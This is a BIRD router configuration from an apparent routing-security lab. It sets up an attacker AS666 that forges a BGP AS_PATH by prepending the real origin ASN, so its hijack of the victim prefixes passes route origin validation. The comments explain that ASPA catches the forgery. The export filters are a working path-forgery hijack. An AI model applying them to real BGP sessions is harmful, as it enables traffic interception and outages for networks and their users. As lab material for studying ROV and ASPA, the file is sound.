################################################################################
# AS666 - forged-path hijack (./scripts/lab.sh step4-hijack-posrov)
#
# The naive hijack (attacker-simple.conf) dies the moment a ROA exists: ROV
# checks the last AS in the path, sees 666, and rejects it. This file forges
# the AS_PATH itself instead of the origin field: AS666 prepends ORIGIN_ASN
# onto the route *before* BIRD's own export-time prepend adds AS666's own
# number, so the path that leaves this router already reads "666 64500" -
# as if AS666 had received the prefix directly from the real origin.
#
# ROV only ever looks at the last AS in the path (bgp_path.last), so this
# still validates: the forged path ends in 64500, exactly what the ROA
# authorizes. ROV has no way to tell that the hop before it is a lie.
#
# ASPA is what catches it: once AS64500 publishes its ASPA object, the
# 64500 -> 666 adjacency in this forged path is checked against it, and
# AS666 was never listed as an authorized provider.
################################################################################

include "/etc/bird-lab/vars.conf";

log stderr all;
router id 10.0.0.66;

protocol device { }

protocol static hijack_v4 {
    ipv4;
    route ORIGIN_V4 unreachable;
}
protocol static hijack_v6 {
    ipv6;
    route ORIGIN_V6 unreachable;
}

# Forge the path so it appears as if AS666 received this prefix directly
# from the origin: prepend ORIGIN_ASN here, and BIRD's own eBGP export
# automatically prepends the local AS (666) in front of that.
filter forge_export_v4 {
    if net = ORIGIN_V4 && source = RTS_STATIC then {
        bgp_path.prepend(ORIGIN_ASN);
        accept;
    }
    reject;
}
filter forge_export_v6 {
    if net = ORIGIN_V6 && source = RTS_STATIC then {
        bgp_path.prepend(ORIGIN_ASN);
        accept;
    }
    reject;
}

protocol bgp observer1_v4 {
    description "observer1 (BIRD), customer - IPv4";
    local as ATTACKER_ASN;
    source address 10.200.7.10;
    neighbor 10.200.7.20 as OBSERVER1_ASN;
    ipv4 { import none; export filter forge_export_v4; };
}
protocol bgp observer1_v6 {
    description "observer1 (BIRD), customer - IPv6";
    local as ATTACKER_ASN;
    source address fd00:7::10;
    neighbor fd00:7::20 as OBSERVER1_ASN;
    ipv6 { import none; export filter forge_export_v6; };
}

protocol bgp observer2_v4 {
    description "observer2 (OpenBGPD), customer - IPv4";
    local as ATTACKER_ASN;
    source address 10.200.8.10;
    neighbor 10.200.8.20 as OBSERVER2_ASN;
    # observer2 resets its sessions whenever the deployment stage changes; BIRD's default
    # error wait (60-300 s, growing with every flap) would make each switch take
    # minutes to settle, so retry fast.
    connect retry time 5;
    error wait time 1, 5;
    ipv4 { import none; export filter forge_export_v4; };
}
protocol bgp observer2_v6 {
    description "observer2 (OpenBGPD), customer - IPv6";
    local as ATTACKER_ASN;
    source address fd00:8::10;
    neighbor fd00:8::20 as OBSERVER2_ASN;
    # observer2 resets its sessions whenever the deployment stage changes; BIRD's default
    # error wait (60-300 s, growing with every flap) would make each switch take
    # minutes to settle, so retry fast.
    connect retry time 5;
    error wait time 1, 5;
    ipv6 { import none; export filter forge_export_v6; };
}
